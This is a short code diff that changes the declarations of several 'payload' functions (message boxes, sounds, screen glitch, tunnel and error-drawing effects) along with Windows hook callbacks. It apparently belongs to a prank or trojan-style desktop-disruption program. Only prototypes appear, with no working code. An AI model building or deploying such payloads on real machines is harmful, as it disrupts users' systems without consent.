@@ -9,9 +9,9 @@ LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
 BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);
 
-PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style);
+PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style, int mode);
 PAYLOAD payloadReverseText();
-PAYLOAD payloadSound();
+PAYLOAD payloadSound(int sound);
 PAYLOAD payloadGlitch(int maxSize, int power);
 PAYLOAD payloadTunnel(int scale);
 PAYLOAD payloadDrawErrors(int count, int chance);
